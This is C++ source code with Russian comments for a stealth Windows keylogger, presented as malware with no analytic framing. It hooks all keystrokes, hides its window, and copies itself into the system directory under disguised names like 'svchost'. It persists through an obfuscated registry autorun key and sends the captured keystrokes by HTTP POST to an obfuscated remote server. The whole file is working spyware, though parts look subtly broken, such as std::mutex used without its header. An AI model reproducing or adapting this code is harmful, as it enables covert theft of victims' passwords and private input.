#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <random>

std::string DecryptString(const std::vector<unsigned char>& encrypted) {
    std::string result;
    unsigned char key = 0xAB;
    for (auto c : encrypted) {
        result += c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return result;
}

const std::vector<unsigned char> enc_server = {0xE1, 0xC8, 0xCD, 0xCC, 0x9A, 0x87, 0x86, 0x87, 0xCC, 0x9A};
const std::vector<unsigned char> enc_regpath = {0xE2, 0xCE, 0xC9, 0x9A, 0x84, 0x87, 0x86, 0x9A, 0xE0, 0xCD, 0xCE, 0xCB, 0x88, 0x9A, 0xE6, 0xC8, 0xC9, 0x88, 0x87, 0x9A, 0xFD, 0xFE};
const std::vector<unsigned char> enc_regname = {0xE6, 0xD4, 0xD5, 0xC8, 0x9A, 0xE6, 0xC8, 0xC9, 0x88, 0x87};

class StealthKeyLogger {
private:
    HHOOK keyboardHook;
    std::string logBuffer;
    std::mutex bufferMutex;
    
    // Случайные имена для обфускации
    std::string GetRandomName() {
        const char* names[] = {"svchost", "runtime", "system32", "tasks", "update"};
        return names[GetTickCount() % 5];
    }
    
    LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
            ProcessKey(kbdStruct->vkCode);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    
    static LRESULT CALLBACK StaticKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        static StealthKeyLogger* instance = nullptr;
        if (!instance) {
            instance = reinterpret_cast<StealthKeyLogger*>(GetWindowLongPtr(GetDesktopWindow(), GWLP_USERDATA));
        }
        if (instance) {
            return instance->KeyboardProc(nCode, wParam, lParam);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    
    void ProcessKey(DWORD vkCode) {
        std::lock_guard<std::mutex> lock(bufferMutex);
        
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        
        WCHAR unicodeChars[5];
        int result = ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, unicodeChars, 4, 0);
        
        if (result > 0) {
            char mbChar[5];
            WideCharToMultiByte(CP_UTF8, 0, unicodeChars, result, mbChar, sizeof(mbChar), NULL, NULL);
            logBuffer += mbChar;
        } else {
            // Специальные клавиши
            switch (vkCode) {
                case VK_SPACE: logBuffer += " "; break;
                case VK_RETURN: logBuffer += "\n"; break;
                case VK_BACK: 
                    if (!logBuffer.empty()) logBuffer.pop_back(); 
                    break;
                case VK_TAB: logBuffer += "[TAB]"; break;
                case VK_CONTROL: logBuffer += "[CTRL]"; break;
                case VK_SHIFT: logBuffer += "[SHIFT]"; break;
                case VK_MENU: logBuffer += "[ALT]"; break;
                case VK_CAPITAL: logBuffer += "[CAPS]"; break;
                case VK_ESCAPE: logBuffer += "[ESC]"; break;
                default: 
                    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
                        logBuffer += "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
                    }
                    break;
            }
        }
        
        if (logBuffer.length() > 500) {
            std::thread(&StealthKeyLogger::SendData, this).detach();
        }
    }

public:
    StealthKeyLogger() : keyboardHook(nullptr) {}
    
    bool InstallToSystem() {
        char modulePath[MAX_PATH];
        GetModuleFileNameA(NULL, modulePath, MAX_PATH);
        
        // Копируем в системную директорию
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        std::string targetPath = std::string(systemPath) + "\\" + GetRandomName() + ".exe";
        
        CopyFileA(modulePath, targetPath.c_str(), FALSE);
        
        // Устанавливаем скрытый атрибут
        SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        
        return AddToRegistry(targetPath);
    }
    
    bool AddToRegistry(const std::string& filePath) {
        HKEY hKey;
        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
            DecryptString(enc_regpath).c_str(), 0, KEY_WRITE, &hKey);
        
        if (result == ERROR_SUCCESS) {
            result = RegSetValueExA(hKey, DecryptString(enc_regname).c_str(), 0, 
                REG_SZ, (const BYTE*)filePath.c_str(), filePath.length());
            RegCloseKey(hKey);
            return result == ERROR_SUCCESS;
        }
        return false;
    }
    
    void SendData() {
        std::lock_guard<std::mutex> lock(bufferMutex);
        if (logBuffer.empty()) return;
        
        // Используем различные методы отправки
        if (SendViaHTTP(logBuffer)) {
            logBuffer.clear();
        }
    }
    
    bool SendViaHTTP(const std::string& data) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) return false;
        
        HINTERNET hConnect = InternetConnectA(hInternet, DecryptString(enc_server).c_str(), 
            8080, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/data", NULL, NULL, NULL, 0, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        // Случайные заголовки для обфускации
        const char* headers = "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0";
        
        bool success = HttpSendRequestA(hRequest, headers, strlen(headers), 
            (LPVOID)data.c_str(), data.length());
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return success;
    }
    
    void Start() {
        // Скрываем окно
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        
        // Устанавливаем в систему при первом запуске
        static bool installed = false;
        if (!installed) {
            installed = InstallToSystem();
        }
        
        // Сохраняем указатель для статического метода
        SetWindowLongPtr(GetDesktopWindow(), GWLP_USERDATA, (LONG_PTR)this);
        
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, StaticKeyboardProc, GetModuleHandle(NULL), 0);
        
        if (keyboardHook) {
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
                
                // Периодическая отправка
                static DWORD lastSend = GetTickCount();
                if (GetTickCount() - lastSend > 30000) { // 30 секунд
                    std::thread(&StealthKeyLogger::SendData, this).detach();
                    lastSend = GetTickCount();
                }
            }
            UnhookWindowsHookEx(keyboardHook);
        }
    }
};